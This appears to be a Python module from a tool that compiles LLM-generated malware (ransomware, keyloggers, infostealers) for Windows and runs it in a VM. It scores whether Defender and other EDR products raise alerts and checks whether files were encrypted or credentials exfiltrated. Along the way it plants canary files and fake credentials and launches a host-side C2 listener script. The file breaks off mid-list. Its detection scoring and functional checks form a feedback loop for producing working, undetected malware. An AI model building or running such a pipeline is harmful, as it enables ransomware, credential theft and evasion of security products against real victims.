"""
Verification pipeline — compiles and executes generated malware in a provisioned VM,
queries EDR/AV for alerts, returns a VerificationResult.

Windows flow:  cross-compile on host (x86_64-w64-mingw32-gcc) → SFTP .exe to VM → run
Linux flow:    SFTP source to VM → compile on VM → run
"""

import asyncio
import logging
import shutil
import subprocess
import tempfile
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path, PureWindowsPath
from typing import Optional, List

logger = logging.getLogger(__name__)


class DetectionLevel(Enum):
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"


class BehaviourCheck(Enum):
    COMPILATION_SUCCESS = "compilation_success"
    EXECUTION_SUCCESS = "execution_success"
    NO_CONSOLE_OUTPUT = "no_console_output"
    LAUNCHES_NETWORK = "launches_network"
    CREATES_FILE = "creates_file"
    MODIFIES_REGISTRY = "modifies_registry"
    SPLASH_WINDOW = "splash_window"
    DYNAMIC_DISPATCH = "dynamic_dispatch"
    FUNCTIONAL_GOAL_MET = "functional_goal_met"


@dataclass
class ValidationCheck:
    """One LLM-generated check that verifies the malware performed its intended function."""
    description: str
    command: str
    success_pattern: str  # substring that must appear in command output
    negate: bool = False  # if True, check passes when pattern is NOT found


@dataclass
class ValidationPlan:
    """Set of behavioral validation checks generated before the verification loop."""
    checks: list[ValidationCheck]
    is_windows: bool
    setup_commands: list[str] = field(default_factory=list)  # run on VM before exe launches


@dataclass
class AlertRecord:
    edr_name: str
    alert_type: str
    severity: str
    process_path: str
    timestamp_offset: float
    message: str = ""
    rule_name: str = ""
    detection_category: str = ""


@dataclass
class VerificationResult:
    detection_score: DetectionLevel = DetectionLevel.NONE
    alerts: List[AlertRecord] = field(default_factory=list)
    behaviour_checks: dict[BehaviourCheck, bool] = field(default_factory=dict)
    compilation_output: str = ""
    execution_output: str = ""
    execution_exit_code: int = 0
    sandbox_detected: bool = False
    functional_validation_passed: Optional[bool] = None  # None = not checked
    functional_validation_output: str = ""

    @property
    def is_undetected(self) -> bool:
        return self.detection_score == DetectionLevel.NONE

    @property
    def total_alerts(self) -> int:
        return len(self.alerts)


def _is_windows(spec) -> bool:
    return "windows" in (spec.os_version or "").lower() or \
           (hasattr(spec, "os_platform") and spec.os_platform.value == "windows")


def _classify_malware_type(malware_type: str) -> str:
    """Normalize freeform malware_type string into a canonical category."""
    t = malware_type.lower().strip()
    if any(k in t for k in ("ransom", "encrypt", "locker")):
        return "ransomware"
    if any(k in t for k in ("keylog", "key log", "keystroke")):
        return "keylogger"
    if any(k in t for k in ("info steal", "infostealer", "credential", "password steal",
                             "data exfil", "browser steal", "cookie steal")):
        return "infostealer"
    return "generic"


class Verifier:
    """Runs generated malware in a provisioned VM and checks for detections."""

    def __init__(self, vm_instance=None, debug=None, output_dir: Optional[Path] = None, source_language: str = "c"):
        self._vm = vm_instance
        self._debug = debug
        self._output_dir = output_dir
        self._source_language = source_language

    async def verify(
        self,
        source_code: str,
        target_spec,
        compiler_instructions: str = "",
        timeout: int = 120,
        check_sandbox: bool = True,
        validation_plan: Optional["ValidationPlan"] = None,
        edr_configs: Optional[list] = None,
    ) -> VerificationResult:
        """Full verification pipeline.

        Windows: cross-compile on host → SFTP .exe to VM → execute
        Linux:   SFTP source to VM → compile on VM → execute
        """
        if not self._vm:
            raise RuntimeError("No VM instance attached.")

        result = VerificationResult()
        win = _is_windows(target_spec)

        if win:
            await self._verify_windows(result, source_code, target_spec,
                                        compiler_instructions, timeout,
                                        validation_plan=validation_plan)
        else:
            await self._verify_linux(result, source_code, target_spec,
                                      compiler_instructions, timeout)

        # Skip EDR/behaviour/sandbox checks if compilation failed — the binary
        # doesn't exist so none of these checks are meaningful.
        if not result.behaviour_checks.get(BehaviourCheck.COMPILATION_SUCCESS, True):
            return result

        # EDR alerts — use pluggable configs if provided, else legacy path
        if edr_configs:
            for edr_cfg in edr_configs:
                edr_alerts = await self._check_edr_alerts(target_spec, win, edr_config=edr_cfg)
                result.alerts.extend(edr_alerts)
        elif target_spec.edrs:
            result.alerts = await self._check_edr_alerts(target_spec, win)
        if result.total_alerts == 0:
            result.detection_score = DetectionLevel.NONE
        elif result.total_alerts <= 1 and any(a.severity == "info" for a in result.alerts):
            result.detection_score = DetectionLevel.LOW
        elif result.total_alerts <= 3:
            result.detection_score = DetectionLevel.MEDIUM
        else:
            result.detection_score = DetectionLevel.HIGH

        await self._run_behaviour_checks(result, target_spec, win)

        if check_sandbox:
            result.sandbox_detected = await self._check_sandbox(win)

        return result

    async def run_validation_checks(self, plan: ValidationPlan, settle_secs: int = 5) -> bool:
        """Run all behavioral validation checks against the live VM.

        Returns True if a majority of checks pass (tolerates LLM-generated checks
        that point to the wrong path or slightly wrong pattern).
        An empty plan returns False — no evidence of function means not a success.
        """
        if not plan.checks:
            logger.warning("run_validation_checks called with empty plan — returning False")
            return False

        # Brief settle wait so any async file writes / registry ops finish
        if settle_secs > 0:
            await asyncio.sleep(settle_secs)

        n_pass = 0
        outputs: list[str] = []
        for check in plan.checks:
            try:
                output = await self._vm.execute_command(check.command, timeout=30)
                out_lower = output.lower()
                pattern = check.success_pattern.lower()
                ok = pattern in out_lower
                if ok and out_lower.strip() == "":
                    ok = False
                if check.negate:
                    ok = not ok
                n_pass += ok
                outputs.append(f"[{'PASS' if ok else 'FAIL'}] {check.description}: {output[:200]}")
                logger.info("Validation check '%s': %s", check.description, "PASS" if ok else "FAIL")
            except Exception as exc:
                outputs.append(f"[ERROR] {check.description}: {exc}")
                logger.warning("Validation check '%s' error: %s", check.description, exc)

        threshold = (len(plan.checks) + 1) // 2  # strict majority
        overall = n_pass >= threshold
        logger.info(
            "Behavioral validation: %d/%d checks passed (threshold %d) — %s",
            n_pass, len(plan.checks), threshold, "PASS" if overall else "FAIL",
        )
        return overall

    # ------------------------------------------------------------------
    # Windows path
    # ------------------------------------------------------------------

    async def _verify_windows(self, result, source_code, spec,
                               compiler_instructions, timeout,
                               validation_plan=None):
        # Step 1: cross-compile on host — dispatch by source language
        _lang = getattr(self, "_source_language", "c")
        _output_format = getattr(spec, "output_format", "exe")

        # For DLL output, wrap the source code with DllMain/exports
        if _output_format == "dll" and _lang == "c":
            from .generation_engine import GenerationEngine
            source_code = GenerationEngine._wrap_for_dll(source_code)

        with tempfile.TemporaryDirectory() as td:
            # Determine output file based on format
            if _output_format == "dll":
                out_binary = Path(td) / "malware_test.dll"
                _out_ext = ".dll"
            elif _output_format == "shellcode":
                out_binary = Path(td) / "malware_test.obj"  # intermediate
                _out_ext = ".bin"
            else:
                out_binary = Path(td) / "malware_test.exe"
                _out_ext = ".exe"

            if _lang == "rust":
                rustc = shutil.which("rustc") or str(Path.home() / ".cargo" / "bin" / "rustc")
                if not Path(rustc).is_file():
                    raise RuntimeError("rustc not found. Install with: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
                src = Path(td) / "malware_source.rs"
                src.write_text(source_code)
                _crate_type = "cdylib" if _output_format == "dll" else "bin"
                compile_cmd = (
                    f"{rustc} --target x86_64-pc-windows-gnu "
                    f"--crate-type {_crate_type} "
                    f"-C opt-level=2 -C strip=symbols "
                    f"{src} -o {out_binary} 2>&1"
                )
            elif _lang == "go":
                go = shutil.which("go")
                if not go:
                    raise RuntimeError("go not found. Install with: sudo apt install golang-go")
                src = Path(td) / "malware_source.go"
                src.write_text(source_code)
                _go_buildmode = "-buildmode=c-shared" if _output_format == "dll" else ""
                compile_cmd = (
                    f"GOOS=windows GOARCH=amd64 CGO_ENABLED=0 "
                    f"{go} build {_go_buildmode} -ldflags='-s -w' -o {out_binary} {src} 2>&1"
                )
            else:
                mingw = shutil.which("x86_64-w64-mingw32-gcc")
                if not mingw:
                    raise RuntimeError(
                        "x86_64-w64-mingw32-gcc not found on host. "
                        "Install with: sudo apt install gcc-mingw-w64"
                    )
                src = Path(td) / "malware_src.c"
                src.write_text(source_code)
                extra_flags = self._extract_mingw_flags(compiler_instructions)
                _std_libs = (
                    "-lws2_32 -ladvapi32 -lole32 -loleaut32 -luuid "
                    "-lgdi32 -luser32 -lshell32 -lshlwapi "
                    "-lwininet -lpsapi -lcrypt32 -lcomdlg32 -lnetapi32 -lmpr -liphlpapi"
                )

                if _output_format == "dll":
                    compile_cmd = (
                        f"{mingw} -O2 -s -shared -m64 "
                        f"-ffunction-sections -fdata-sections -Wl,--gc-sections "
                        f"-Wl,--out-implib,{Path(td) / 'malware_test.lib'} "
                        f"{extra_flags} "
                        f"{src} -o {out_binary} "
                        f"{_std_libs} 2>&1"
                    )
                elif _output_format == "shellcode":
                    compile_cmd = (
                        f"{mingw} -O2 -m64 -c "
                        f"-fPIC -fno-stack-protector "
                        f"{extra_flags} "
                        f"{src} -o {out_binary} "
                        f"2>&1"
                    )
                else:
                    compile_cmd = (
                        f"{mingw} -O2 -s -static -m64 "
                        f"-ffunction-sections -fdata-sections -Wl,--gc-sections "
                        f"{extra_flags} "
                        f"{src} -o {out_binary} "
                        f"{_std_libs} 2>&1"
                    )

            logger.info("Compile command (%s, format=%s): %s", _lang, _output_format, compile_cmd)
            proc = await asyncio.create_subprocess_shell(
                compile_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            stdout, _ = await proc.communicate()
            compiler_stdout = stdout.decode("utf-8", errors="replace")
            result.compilation_output = f"$ {compile_cmd}\n{compiler_stdout}"
            result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = (proc.returncode == 0)

            if self._debug:
                self._debug.step("vfy_1_compile",
                    f"Cross-compile ({_lang}, {_output_format}) {'ok' if proc.returncode == 0 else 'FAILED'} (rc={proc.returncode})")

            if proc.returncode != 0:
                logger.warning("Compilation failed:\n%s", result.compilation_output)
                return

            # Shellcode post-processing: extract .text section to raw binary
            if _output_format == "shellcode" and proc.returncode == 0:
                objcopy = shutil.which("x86_64-w64-mingw32-objcopy") or shutil.which("objcopy")
                if not objcopy:
                    logger.warning("objcopy not found — cannot extract shellcode .text section")
                    result.compilation_output += "\nobjcopy not found"
                    result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = False
                    return
                sc_bin = Path(td) / "malware_test.bin"
                sc_cmd = f"{objcopy} -O binary -j .text {out_binary} {sc_bin} 2>&1"
                sc_proc = await asyncio.create_subprocess_shell(
                    sc_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                sc_stdout, _ = await sc_proc.communicate()
                result.compilation_output += f"\n$ {sc_cmd}\n{sc_stdout.decode('utf-8', errors='replace')}"
                if sc_proc.returncode != 0:
                    result.behaviour_checks[BehaviourCheck.COMPILATION_SUCCESS] = False
                    logger.warning("Shellcode extraction failed:\n%s", result.compilation_output)
                    return
                out_binary = sc_bin
                logger.info("Shellcode extracted: %d bytes", sc_bin.stat().st_size)

            # Save output to results directory
            if self._output_dir:
                _save_ext = {
                    "exe": ".exe", "dll": ".dll", "shellcode": ".bin",
                }.get(_output_format, ".exe")
                dest_out = self._output_dir / f"malware_source{_save_ext}"
                shutil.copy2(str(out_binary), str(dest_out))
                logger.info("Compiled %s saved to %s", _output_format, dest_out)
                if _output_format == "dll":
                    _implib = Path(td) / "malware_test.lib"
                    if _implib.exists():
                        shutil.copy2(str(_implib), str(self._output_dir / "malware_source.lib"))

            # Step 1b: pre-deployment binary analysis
            try:
                from .binary_analyzer import analyze_binary as _analyze_bin
                _ba_result = await _analyze_bin(out_binary)
                if _ba_result.report:
                    result.compilation_output = (result.compilation_output or "") + f"\n\n{_ba_result.report}"
                if _ba_result.should_skip_vm:
                    logger.warning("Binary analysis: risk_score=%.0f — skipping VM deployment", _ba_result.risk_score)
                    for _imp in _ba_result.suspicious_imports[:5]:
                        result.alerts.append(AlertRecord(
                            edr_name="binary_analysis", alert_type="static_detection",
                            severity="medium", process_path=str(out_binary), timestamp_offset=0,
                            message=f"Suspicious import: {_imp}", rule_name="import_check",
                        ))
                    result.detection_score = DetectionLevel.MEDIUM
                    return result
                logger.info("Binary analysis: risk_score=%.0f — proceeding to VM", _ba_result.risk_score)
            except Exception as _ba_exc:
                logger.debug("Binary analysis skipped: %s", _ba_exc)

            # Step 2: upload binary to VM
            if _output_format == "dll":
                remote_binary = r"C:\Users\vmuser\malware_test.dll"
            elif _output_format == "shellcode":
                remote_binary = r"C:\Users\vmuser\malware_test.bin"
            else:
                remote_binary = r"C:\Users\vmuser\malware_test.exe"
            await self._vm.upload_file(str(out_binary), remote_binary)

            # For shellcode: also upload a loader that executes the raw shellcode
            if _output_format == "shellcode":
                await self._upload_shellcode_runner(td)

            if self._debug:
                self._debug.step("vfy_2_upload", f"Uploaded {_output_format} -> {remote_binary}")

        # Step 2b: create test artifacts based on malware type
        _malware_type = _classify_malware_type(getattr(spec, "malware_type", ""))
        _pre_hashes: dict[str, str] = {}

        if _malware_type == "ransomware":
            _pre_hashes = await self._setup_ransomware_canaries()
        elif _malware_type == "keylogger":
            await self._setup_keylogger_canaries()
        elif _malware_type == "infostealer":
            await self._setup_infostealer_canaries(spec)

        # Step 2c: run pre-execution setup commands from validation plan
        # Skip commands that would overwrite canary files the verifier already created —
        # those would poison the hash baseline and cause false positive "content changed"
        _canary_paths = {"canary_doc", "canary_sheet", "canary_photo", "root_canary", "canary_files"}
        if validation_plan and validation_plan.setup_commands:
            for setup_cmd in validation_plan.setup_commands:
                if _pre_hashes and any(cp in setup_cmd for cp in _canary_paths):
                    logger.info("Skipping LLM setup command (would overwrite verifier canary): %s", setup_cmd[:120])
                    continue
                try:
                    await self._vm.execute_command(setup_cmd, timeout=15)
                    logger.info("Pre-execution setup: %s", setup_cmd[:120])
                except Exception as exc:
                    logger.warning("Pre-execution setup command failed (%s): %s", setup_cmd[:80], exc)

        # Step 2d: start a C2 listener on the host for connection-back malware
        _c2_proc = None
        _c2_data_file: Optional[Path] = None
        if _malware_type in ("infostealer", "keylogger"):
            _c2_port = getattr(spec, "c2_port", 9001)
            _c2_data_file = Path("/tmp/c2_received_data.bin")
            _c2_data_file.unlink(missing_ok=True)
            _c2_script = (
                "import socket,threading,sys,os\n"
                "outf=sys.argv[2]\n"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
                "s.bind(('0.0.0.0',int(sys.argv[1])))\n"
                "s.listen(5)\n"
                "def h(c,a):\n"
                " data=b''\n"
                " try:\n"
                "  while True:\n"
                "   chunk=c.recv(65536)\n"
                "   if not chunk:break\n"
                "   data+=chunk\n"
                " except:pass\n"
                " c.close()\n"
                " if data:\n"
                "  with open(outf,'ab') as f:f.write(data)\n"
                "while True:\n"
                " c,a=s.accept()\n"
                " threading.Thread(target=h,args=(c,a),daemon=True).start()\n"
            )
            try:
                _c2_proc = subprocess.Popen(
                    ["python3", "-c", _c2_script, str(_c2_port), str(_c2_data_file)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                logger.info("C2 listener started on port %d (PID %d), data -> %s",
                            _c2_port, _c2_proc.pid, _c2_data_file)
            except Exception as exc:
                logger.warning("Could not start C2 listener: %s", exc)

        # Step 2e: Defender pre-scan — run MpCmdRun.exe -Scan for immediate verdict
        if self._vm:
            try:
                from .edr_rule_extractor import DefenderRuleExtractor
                _defender = DefenderRuleExtractor(self._vm)
                _scan = await _defender.scan_binary(remote_binary, timeout=45)
                if _scan.detected:
                    logger.warning("Defender pre-scan DETECTED: %s", _scan.summary)
                    result.alerts.append(AlertRecord(
                        edr_name="windows_defender",
                        alert_type="pre_scan",
                        severity=_scan.severity or "high",
                        process_path=remote_binary,
                        timestamp_offset=0,
                        message=f"Pre-execution scan: {_scan.threat_name}",
                        rule_name=_scan.threat_name,
                        detection_category=_scan.threat_type,
                    ))
                    result.detection_score = DetectionLevel.HIGH
                    if self._debug:
                        self._debug.step("vfy_2e_prescan", f"Defender pre-scan: {_scan.summary}")
                else:
                    logger.info("Defender pre-scan: clean (%.1fs)", _scan.scan_time_sec)
                    if self._debug:
                        self._debug.step("vfy_2e_prescan", "Defender pre-scan: clean")
            except Exception as _ps_exc:
                logger.debug("Defender pre-scan skipped: %s", _ps_exc)

        # Step 3: execute on VM — launch in background, check for early crash,
        # then wait for malware to do real work.
        if _output_format == "dll":
            # DLL: execute via rundll32 calling the exported RunPayload function
            _proc_name = "rundll32.exe"
            exec_cmd = (
                f'start /B "" rundll32.exe "{remote_binary}",RunPayload & '
                f'timeout /t 3 /nobreak >NUL & '
                f'tasklist /fi "imagename eq {_proc_name}" /fo csv 2>NUL '
                f'| find /i "{_proc_name}" >NUL '
                f'&& (echo PROCESS_ALIVE & timeout /t 12 /nobreak >NUL & echo LAUNCHED) '
                f'|| echo PROCESS_DEAD_EARLY'
            )
        elif _output_format == "shellcode":
            # Shellcode: execute via the uploaded sc_runner.exe loader
            _sc_runner = r"C:\Users\vmuser\sc_runner.exe"
            _proc_name = "sc_runner.exe"
            exec_cmd = (
                f'start /B "" "{_sc_runner}" "{remote_binary}" & '
                f'timeout /t 3 /nobreak >NUL & '
                f'tasklist /fi "imagename eq {_proc_name}" /fo csv 2>NUL '
                f'| find /i "{_proc_name}" >NUL '
                f'&& (echo PROCESS_ALIVE & timeout /t 12 /nobreak >NUL & echo LAUNCHED) '
                f'|| echo PROCESS_DEAD_EARLY'
            )
        else:
            _exe_name = PureWindowsPath(remote_binary).name
            exec_cmd = (
                f'powershell -NoProfile -Command "'
                f'Start-Process -FilePath \'{remote_binary}\' -WindowStyle Hidden; '
                f'Start-Sleep -Seconds 3; '
                f'$p = Get-Process -Name \'{_exe_name.replace(".exe","")}\' -ErrorAction SilentlyContinue; '
                f'if ($p) {{ Write-Output PROCESS_ALIVE; Start-Sleep -Seconds 20; Write-Output LAUNCHED }} '
                f'else {{ Write-Output PROCESS_DEAD_EARLY }}'
                f'"'
            )
        try:
            exec_out = await self._vm.execute_command(exec_cmd, timeout=timeout)
            result.execution_output = exec_out
            if "PROCESS_DEAD_EARLY" in exec_out:
                result.execution_exit_code = 1
                result.behaviour_checks[BehaviourCheck.EXECUTION_SUCCESS] = False
                logger.warning("Malware process exited within 3s of launch — likely crashed")
            else:
                result.execution_exit_code = 0
                result.behaviour_checks[BehaviourCheck.EXECUTION_SUCCESS] = (
                    "LAUNCHED" in exec_out or "PROCESS_ALIVE" in exec_out
                )
        except Exception as e:
            result.execution_output = str(e)
            result.execution_exit_code = 1
            result.behaviour_checks[BehaviourCheck.EXECUTION_SUCCESS] = False

        if self._debug:
            self._debug.step("vfy_3_execute",
                f"Execute {'ok' if result.execution_exit_code == 0 else 'FAILED'}")

        # Step 4: behavioral validation — check if the malware actually DID something
        if result.behaviour_checks.get(BehaviourCheck.EXECUTION_SUCCESS):
            if _malware_type == "ransomware":
                await self._check_ransomware_behaviour(result, pre_hashes=_pre_hashes)
            elif _malware_type == "keylogger":
                await self._check_keylogger_behaviour(result, spec)
            elif _malware_type == "infostealer":
                await self._check_infostealer_behaviour(result, spec, c2_data_file=_c2_data_file)
            else:
                logger.info("No type-specific behavioral check for '%s' — relying on validation plan",
                            getattr(spec, "malware_type", "unknown"))

        # Step 5: tear down C2 listener
        if _c2_proc is not None:
            _c2_proc.terminate()
            try:
                _c2_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                _c2_proc.kill()
            logger.info("C2 listener stopped (PID %d)", _c2_proc.pid)

    async def _check_ransomware_behaviour(self, result: VerificationResult,
                                            pre_hashes: Optional[dict[str, str]] = None):
        """Post-execution checks: did the ransomware actually encrypt files / drop notes?

        A ransomware must demonstrably encrypt files to pass. Registry persistence or
        file counts alone are NOT sufficient — we require evidence that file contents
        were modified or renamed to encrypted extensions.
        """
        _CANARY_CHECKS: list[tuple[str, str]] = [
            (r"C:\Users\vmuser\Documents\canary_files", "canary_doc.txt"),
            (r"C:\Users\vmuser\Documents\canary_files", "canary_photo.jpg"),
            (r"C:\Users\vmuser\Documents\canary_files", "canary_sheet.xlsx"),
            (r"C:\Users\vmuser\Documents", "root_canary.txt"),
            (r"C:\Users\vmuser\Desktop", "root_canary.txt"),
            (r"C:\Users\vmuser\Downloads", "root_canary.txt"),
        ]

        _strong_evidence = []
        _weak_evidence = []

        # 1. Check canary files: were they modified, renamed, or deleted?
        for cdir, fname in _CANARY_CHECKS:
            fpath = f"{cdir}\\{fname}"
            _key = f"{cdir}|{fname}"
            pre_hash = (pre_hashes or {}).get(_key)
            try:
                check_cmd = f'cmd /c "if exist ""{fpath}"" (echo EXISTS) else (echo GONE)"'
                out = (await self._vm.execute_command(check_cmd, timeout=8)).strip()
                if "GONE" in out:
                    if pre_hash is None:
                        logger.warning(
                            "Canary %s reported GONE but was never verified as created — "
                            "ignoring (possible false positive)", fpath,
                        )
                        continue
                    enc_check = (
                        f'cmd /c "dir /b ""{cdir}\\{fname}.*"" 2>NUL"'
                    )
                    enc_out = (await self._vm.execute_command(enc_check, timeout=8)).strip()
                    if enc_out and "File Not Found" not in enc_out:
                        _strong_evidence.append(f"canary_renamed:{fpath}→{enc_out.splitlines()[0]}")
                        logger.info("Canary %s renamed to %s", fpath, enc_out.splitlines()[0])
                    else:
                        _strong_evidence.append(f"canary_deleted:{fpath}")
                        logger.info("Canary %s deleted (encrypted+replaced or destroyed)", fpath)
                else:
                    hash_cmd = f'certutil -hashfile "{fpath}" MD5 2>NUL'
                    hash_out = (await self._vm.execute_command(hash_cmd, timeout=8)).strip()
                    if hash_out:
                        _hlines = [l.strip() for l in hash_out.splitlines() if l.strip()]
                        if len(_hlines) >= 2 and pre_hash:
                            post_hash = _hlines[1].replace(" ", "").lower()
                            if post_hash != pre_hash:
                                _plaintext_gone = False
                                try:
                                    _probe = f'findstr /c:"canary" "{fpath}" 2>NUL'
                                    _probe_out = (await self._vm.execute_command(_probe, timeout=8)).strip()
                                    _plaintext_gone = ("canary" not in _probe_out.lower())
                                except Exception:
                                    _plaintext_gone = True
                                if _plaintext_gone:
                                    _strong_evidence.append(f"canary_modified:{fpath}")
                                    logger.info("Canary %s encrypted (hash %s→%s, plaintext gone)",
                                                fpath, pre_hash[:8], post_hash[:8])
                                else:
                                    logger.warning(
                                        "Canary %s hash changed (%s→%s) but plaintext still readable "
                                        "— NOT counting as encryption (likely overwritten by setup)",
                                        fpath, pre_hash[:8], post_hash[:8])
                            else:
                                logger.debug("Canary %s unchanged (hash matches pre-execution)", fpath)
                        result.execution_output += f"\n[CANARY] {fpath} hash: {hash_out}"
            except Exception as exc:
                logger.debug("Canary check '%s' failed: %s", fpath, exc)

        # 2. Check for encrypted file extensions anywhere in user dirs
        enc_ext_cmd = (
            'cmd /c "dir /s /b C:\\Users\\vmuser\\Documents\\*.encrypted '
            'C:\\Users\\vmuser\\Documents\\*.locked '
            'C:\\Users\\vmuser\\Documents\\*.enc '
            'C:\\Users\\vmuser\\Documents\\*.crypt '
            'C:\\Users\\vmuser\\Downloads\\*.encrypted '
            'C:\\Users\\vmuser\\Downloads\\*.locked '
            'C:\\Users\\vmuser\\Downloads\\*.enc '
            'C:\\Users\\vmuser\\Downloads\\*.crypt '
            'C:\\Users\\vmuser\\Desktop\\*.encrypted '
            'C:\\Users\\vmuser\\Desktop\\*.locked '
            'C:\\Users\\vmuser\\Desktop\\*.enc '
            'C:\\Users\\vmuser\\Desktop\\*.crypt 2>NUL"'
        )
        try:
            out = (await self._vm.execute_command(enc_ext_cmd, timeout=10)).strip()
            if out and "File Not Found" not in out:
                _strong_evidence.append(f"encrypted_extensions:{len(out.splitlines())} files")
                logger.info("Encrypted file extensions found: %s", out[:300])
        except Exception as exc:
            logger.debug("Encrypted extension check failed: %s", exc)

        # 3. Check for ransom notes
        note_cmd = (
            'cmd /c "dir /s /b C:\\Users\\vmuser\\*RANSOM* C:\\Users\\vmuser\\*README* '
            'C:\\Users\\vmuser\\*DECRYPT* C:\\Users\\vmuser\\*LOCKED* '
            'C:\\Users\\vmuser\\*RECOVER* C:\\Users\\vmuser\\*ENCRYPTED* '
            'C:\\Users\\vmuser\\*HOW_TO* C:\\Users\\vmuser\\*RESTORE* 2>NUL"'
        )
        try:
            out = (await self._vm.execute_command(note_cmd, timeout=10)).strip()
            if out and "File Not Found" not in out:
                _strong_evidence.append(f"ransom_note:{out.splitlines()[0]}")
                logger.info("Ransom note found: %s", out[:200])
        except Exception as exc:
            logger.debug("Ransom note check failed: %s", exc)

        # 4. Registry persistence (weak evidence — supplementary only)
        try:
            out = (await self._vm.execute_command(
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v malware_test 2>NUL',
                timeout=8
            )).strip()
            if out and "ERROR" not in out and "malware_test" in out.lower():
                _weak_evidence.append("registry_persist")
                logger.info("Registry persistence detected")
        except Exception:
            pass

        if _strong_evidence:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = True
            result.execution_output += (
                f"\n[BEHAVIOUR] CONFIRMED: {', '.join(_strong_evidence)}"
            )
            if _weak_evidence:
                result.execution_output += f" (also: {', '.join(_weak_evidence)})"
            logger.info("Ransomware behaviour CONFIRMED: %s", _strong_evidence)
        else:
            result.behaviour_checks[BehaviourCheck.FUNCTIONAL_GOAL_MET] = False
            result.execution_output += "\n[BEHAVIOUR] FAILED: No encryption evidence detected"
            if _weak_evidence:
                result.execution_output += f" (weak only: {', '.join(_weak_evidence)})"
            logger.warning(
                "Ransomware behaviour NOT confirmed — no encrypted files, no canary changes, "
                "no ransom notes. Process ran but did not encrypt anything."
            )

    # ------------------------------------------------------------------
    # Per-type canary setup helpers
    # ------------------------------------------------------------------

    async def _setup_ransomware_canaries(self) -> dict[str, str]:
        """Create canary files for ransomware verification. Returns pre-execution hashes."""
        _canary_setup = [
            r'mkdir "C:\Users\vmuser\Documents\canary_files" 2>NUL',
            r'echo This is a canary document for verification. > "C:\Users\vmuser\Documents\canary_files\canary_doc.txt"',
            r'echo This is a canary spreadsheet for verification. > "C:\Users\vmuser\Documents\canary_files\canary_sheet.xlsx"',
            r'echo This is a canary image for verification. > "C:\Users\vmuser\Documents\canary_files\canary_photo.jpg"',
            r'echo Root-level document canary. > "C:\Users\vmuser\Documents\root_canary.txt"',
            r'echo Root-level desktop canary. > "C:\Users\vmuser\Desktop\root_canary.txt"',
            r'echo Root-level downloads canary. > "C:\Users\vmuser\Downloads\root_canary.txt"',
        ]
        for cmd in _canary_setup:
            try:
                await self._vm.execute_command(cmd, timeout=10)
            except Exception:
                pass

        _pre_hashes: dict[str, str] = {}
        _CANARY_PATHS = [
            (r"C:\Users\vmuser\Documents\canary_files", "canary_doc.txt"),
            (r"C:\Users\vmuser\Documents\canary_files", "canary_photo.jpg"),
            (r"C:\Users\vmuser\Documents\canary_files", "canary_sheet.xlsx"),
            (r"C:\Users\vmuser\Documents", "root_canary.txt"),
            (r"C:\Users\vmuser\Desktop", "root_canary.txt"),
            (r"C:\Users\vmuser\Downloads", "root_canary.txt"),
        ]
        for _cdir, _cf in _CANARY_PATHS:
            _cfpath = f"{_cdir}\\{_cf}"
            _key = f"{_cdir}|{_cf}"
            try:
                _vout = await self._vm.execute_command(
                    f'cmd /c "if exist ""{_cfpath}"" (echo EXISTS) else (echo MISSING)"',
                    timeout=10,
                )
                if "EXISTS" in _vout:
                    _hout = await self._vm.execute_command(
                        f'certutil -hashfile "{_cfpath}" MD5 2>NUL', timeout=10,
                    )
                    _hlines = [l.strip() for l in _hout.strip().splitlines() if l.strip()]
                    if len(_hlines) >= 2:
                        _pre_hashes[_key] = _hlines[1].replace(" ", "").lower()
                        logger.debug("Canary %s pre-hash: %s", _key, _pre_hashes[_key][:8])
                else:
                    logger.warning("Canary %s NOT created — canary-based checks unreliable", _cfpath)
            except Exception:
                pass
        if not _pre_hashes:
            logger.warning("No canary files verified — ransomware behavior checks may false-positive")
        return _pre_hashes

    async def _setup_keylogger_canaries(self):
        """Create test artifacts for keylogger verification.

        Plants known text via a PowerShell notepad session. After the exe runs,
        we check whether the typed text was captured to a log file or exfiltrated.
        """
        setup_cmds = [
            r'mkdir "C:\Users\vmuser\Documents\keylog_test" 2>NUL',
            r'echo CANARY_KEYLOG_MARKER > "C:\Users\vmuser\Documents\keylog_test\pre_marker.txt"',
        ]
        for cmd in setup_cmds:
            try:
                await self._vm.execute_command(cmd, timeout=10)
            except Exception:
                pass
        logger.info("Keylogger canaries set up — will simulate keystrokes after exe launch")

    async def _setup_infostealer_canaries(self, spec):
        """Plant fake credentials and sensitive data for infostealer verification.

        Creates fake browser password files, credential text files, and env vars
        that an infostealer should discover and exfiltrate.
        """
        c2_addr = getattr(spec, "c2_address", "10.0.2.2")
        c2_port = getattr(spec, "c2_port", 9001)

        setup_cmds = [
            r'mkdir "C:\Users\vmuser\Documents\credentials" 2>NUL',
            r'echo username=admin > "C:\Users\vmuser\Documents\credentials\passwords.txt"',
            r'echo password=SuperSecret123! >> "C:\Users\vmuser\Documents\credentials\passwords.txt"',
            r'echo api_key=AKIA_FAKE_KEY_FOR_TESTING >> "C:\Users\vmuser\Documents\credentials\passwords.txt"',
            r'echo aws_secret=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY >> "C:\Users\vmuser\Documents\credentials\passwords.txt"',
            r'mkdir "C:\Users\vmuser\AppData\Local\Google\Chrome\User Data\Default" 2>NUL',
            r'echo CANARY_BROWSER_DATA > "C:\Users\vmuser\AppData\Local\Google\Chrome\User Data\Default\Login Data"',
            r'mkdir "C:\Users\vmuser\AppData\Roaming\Mozilla\Firefox\Profiles\test.default" 2>NUL',
            r'echo CANARY_FF_DATA > "C:\Users\vmuser\AppData\Roaming\Mozilla\Firefox\Profiles\test.default\logins.json"',
            r'setx CANARY_SECRET "infostealer_test_token_12345" 2>NUL',
